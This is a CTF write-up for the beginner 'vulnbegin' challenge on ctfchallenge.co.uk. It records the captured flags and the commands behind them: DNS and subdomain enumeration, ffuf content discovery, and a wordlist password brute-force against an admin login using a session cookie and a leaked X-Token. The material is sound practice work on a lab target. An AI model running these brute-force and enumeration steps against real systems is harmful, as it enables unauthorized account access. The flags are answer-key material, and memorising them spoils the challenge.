# ctfchallenge_co_uk


# target: vulnerable website for ctf(ctfchallenge.co.uk)

## easy | vulnbegin | 9 flags

### cookie used during automation: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9


### 4-flag : 
robots.txt --> http://www.vulnbegin.co.uk/secret_d1rect0y/ -->[^FLAG^2B22E2CB70E218510802B0359488F6A2^FLAG^]

tools used and documentation:
#### nslookup -type=any vulnbegin.co.uk 8.8.8.8
The above command will query the DNS server for any default A,TXT,NS,SOA,SPF records. You will see from the results there is a TXT record with a flag.

### 1-flag: [^FLAG^BED649C4DB2DF265BD29419C13D82117^FLAG^]

sublist3r -d vulnbegin.co.uk

The above query uses OSINT to discover domain names from various search engines and other data resources, from the result you will find an obscure subdomain if you visit it this will show you a flag

result:
server.vulnbegin.co.uk

v64hss83.vulnbegin.co.uk

### 3-flag 
[^FLAG^E858ED9649E57BECE9ACD1A4C60D3446^FLAG^] on server.vulnbegin.co.uk
 
 ### 2-flag from sublister : [^FLAG^047524FE61AE6B5FD1D184994C7322FC^FLAG^]


dnsrecon for finding subdomains using brute force
dnsrecon -d vulnbegin.co.uk -D ~/wordlists/subdomains.txt -t brt


content discovery using ffuf:
ffuf -p 0.1 -t 1 -w ~/wordlists/content.txt -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9" -u http://www.vulnbegin.co.uk/FUZZ


in this case username was admin but the response code is 200 for both valid and invalid requests:
to filter out 200 requets i used command:


ffuf -p 0.1 -t 1 -w ~/wordlists/passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200





### 5-flag 	[^FLAG^93D7491FB4B054FB5C5AC3E0292BE41C^FLAG^]





### 6-flag from brute forcing the directry or it can be achieved using ffuf
{"api_key":"X-Token: 492E64385D3779BC5F040E2B19D67742","flag":"[^FLAG^F6A691584431F9F2C29A3A2DE85A2210^FLAG^]"}


### 7-flag from adding X-Token we got from cpanel/env 
{"messaged":"User Authenticated","flag":"[^FLAG^0BDC60CC5E283476E7107C814C18DCCF^FLAG^]"}


### 8-flag 
"flag":"[^FLAG^7B3A24F3368E71842ED7053CF1E51BB0^FLAG^]",
